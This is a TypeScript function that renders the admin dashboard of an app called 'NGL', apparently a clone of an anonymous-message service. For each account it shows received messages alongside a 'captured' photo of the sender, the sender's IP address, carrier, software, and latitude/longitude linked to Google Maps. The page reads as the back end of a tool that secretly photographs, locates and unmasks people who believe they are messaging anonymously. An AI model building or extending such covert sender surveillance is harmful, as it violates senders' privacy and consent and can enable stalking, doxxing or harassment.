export function renderAdmin(): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NGL — Admin</title>
<link rel="icon" href="/static/logo.png">
<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family:'Nunito',-apple-system,sans-serif; background:#0e0e12; color:#eee; }
  header { background:#16161d; padding:16px 22px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:10; border-bottom:1px solid #26262f; }
  header h1 { font-size:20px; font-weight:900; display:flex; align-items:center; gap:10px; }
  header img { width:32px; height:32px; border-radius:8px; }
  header a { color:#ff7a00; text-decoration:none; font-weight:800; font-size:14px; }
  .layout { display:flex; min-height:calc(100vh - 64px); }
  .sidebar { width:320px; border-right:1px solid #26262f; overflow-y:auto; background:#131319; }
  .sidebar h2 { font-size:13px; text-transform:uppercase; letter-spacing:1px; color:#777; padding:16px 18px 8px; }
  .acct { padding:14px 18px; border-bottom:1px solid #1f1f27; cursor:pointer; transition:.15s; }
  .acct:hover, .acct.active { background:#1d1d26; }
  .acct .name { font-weight:900; font-size:15px; }
  .acct .meta { font-size:12px; color:#888; margin-top:3px; }
  .badge { background:#ff7a00; color:#000; font-size:10px; font-weight:900; padding:2px 7px; border-radius:10px; margin-left:6px; }
  .badge.admin { background:#4285f4; color:#fff; }
  .main { flex:1; padding:24px; overflow-y:auto; }
  .empty-main { color:#666; text-align:center; padding-top:80px; font-weight:800; }
  .acct-header { display:flex; align-items:center; gap:16px; margin-bottom:22px; }
  .acct-header .pic { width:64px; height:64px; border-radius:50%; background:#e3e3e6 center/cover no-repeat; display:flex; align-items:center; justify-content:center; overflow:hidden; }
  .acct-header .pic img { width:100%; height:100%; object-fit:cover; }
  .no-pfp { width:100%; height:100%; display:block; }
  .acct-header .info h2 { font-size:22px; font-weight:900; }
  .acct-header .info p { color:#888; font-weight:700; font-size:13px; }
  .msg-card { background:#16161d; border:1px solid #26262f; border-radius:16px; padding:18px; margin-bottom:18px; }
  .msg-top { display:flex; gap:18px; align-items:flex-start; }
  .msg-photo { width:120px; height:120px; border-radius:12px; object-fit:cover; background:#000; flex-shrink:0; border:1px solid #333; }
  .msg-photo.none { display:flex; align-items:center; justify-content:center; color:#555; font-size:12px; font-weight:800; text-align:center; }
  .msg-content { flex:1; min-width:0; }
  .msg-body { font-weight:900; font-size:17px; margin-bottom:12px; word-break:break-word; }
  .detail-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr)); gap:10px; }
  .detail { background:#0e0e12; border:1px solid #23232c; border-radius:10px; padding:9px 12px; }
  .detail .k { font-size:11px; text-transform:uppercase; letter-spacing:.5px; color:#777; font-weight:800; }
  .detail .v { font-weight:800; font-size:14px; margin-top:2px; color:#eee; word-break:break-word; }
  .detail .v a { color:#ff7a00; text-decoration:none; }
  @media (max-width:720px){ .layout{ flex-direction:column; } .sidebar{ width:100%; max-height:220px; } .msg-photo{ width:90px; height:90px; } }
</style>
</head>
<body>
<header>
  <h1><img src="/static/logo.png">Admin Dashboard</h1>
  <a href="/dashboard">← Back to app</a>
</header>
<div class="layout">
  <aside class="sidebar">
    <h2>Accounts</h2>
    <div id="acctList"></div>
  </aside>
  <main class="main" id="mainPane">
    <div class="empty-main">← Select an account to view its messages, captured photos & sender data</div>
  </main>
</div>
<script>
  let ACCOUNTS = [];
  function esc(s){ return String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
  function fmt(iso){ const d=new Date(iso.replace(' ','T')+'Z'); const p=n=>String(n).padStart(2,'0'); return p(d.getMonth()+1)+'/'+p(d.getDate())+'/'+d.getFullYear()+' '+p(d.getHours())+':'+p(d.getMinutes()); }

  async function loadAccounts(){
    const res = await fetch('/api/admin/accounts');
    if(!res.ok){ document.body.innerHTML='<p style="padding:40px">Forbidden. Admins only.</p>'; return; }
    const data = await res.json();
    ACCOUNTS = data.accounts;
    document.getElementById('acctList').innerHTML = ACCOUNTS.map(a=>
      \`<div class="acct" id="acct-\${a.id}" onclick="selectAccount(\${a.id})">
        <div class="name">@\${esc(a.username)}\${a.is_admin?'<span class="badge admin">ADMIN</span>':''}<span class="badge">\${a.message_count} msg</span></div>
        <div class="meta">Joined \${fmt(a.created_at)}</div>
      </div>\`).join('') || '<div style="padding:18px;color:#666">No accounts yet</div>';
  }

  async function selectAccount(id){
    document.querySelectorAll('.acct').forEach(e=>e.classList.remove('active'));
    document.getElementById('acct-'+id).classList.add('active');
    const pane = document.getElementById('mainPane');
    pane.innerHTML = '<div class="empty-main">Loading…</div>';
    const res = await fetch('/api/admin/account/'+id);
    const data = await res.json();
    const a = data.account;
    const pic = a.profile_pic ? '<img src="'+a.profile_pic+'">' : '<svg class="no-pfp" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-label="No profile picture"><circle cx="50" cy="50" r="50" fill="#e3e3e6"/><circle cx="50" cy="40" r="16" fill="#b6b6bd"/><path d="M22 84c0-15 12.5-24 28-24s28 9 28 24z" fill="#b6b6bd"/></svg>';
    let html = \`<div class="acct-header"><div class="pic">\${pic}</div><div class="info"><h2>@\${esc(a.username)}</h2><p>\${data.messages.length} message(s) · Joined \${fmt(a.created_at)}</p></div></div>\`;
    if(data.messages.length===0){ html += '<div class="empty-main">No messages received.</div>'; }
    else {
      html += data.messages.map(m=>{
        const photo = m.photo ? '<img class="msg-photo" src="'+m.photo+'">' : '<div class="msg-photo none">No photo</div>';
        const maplink = (m.lat!=null && m.lon!=null) ? '<a href="https://maps.google.com/?q='+m.lat+','+m.lon+'" target="_blank">'+esc(m.location)+' 🗺</a>' : esc(m.location||'Unknown');
        return \`<div class="msg-card"><div class="msg-top">\${photo}<div class="msg-content">
          <div class="msg-body">"\${esc(m.body)}"</div>
          <div class="detail-grid">
            <div class="detail"><div class="k">Software</div><div class="v">\${esc(m.software)}</div></div>
            <div class="detail"><div class="k">Carrier / ISP</div><div class="v">\${esc(m.carrier)}</div></div>
            <div class="detail"><div class="k">Sent from</div><div class="v">\${esc(m.sent_from)}</div></div>
            <div class="detail"><div class="k">Location</div><div class="v">\${maplink}</div></div>
            <div class="detail"><div class="k">IP Address</div><div class="v">\${esc(m.ip)}</div></div>
            <div class="detail"><div class="k">Time sent</div><div class="v">\${fmt(m.created_at)}</div></div>
          </div>
        </div></div></div>\`;
      }).join('');
    }
    pane.innerHTML = html;
  }
  loadAccounts();
</script>
</body>
</html>`
}
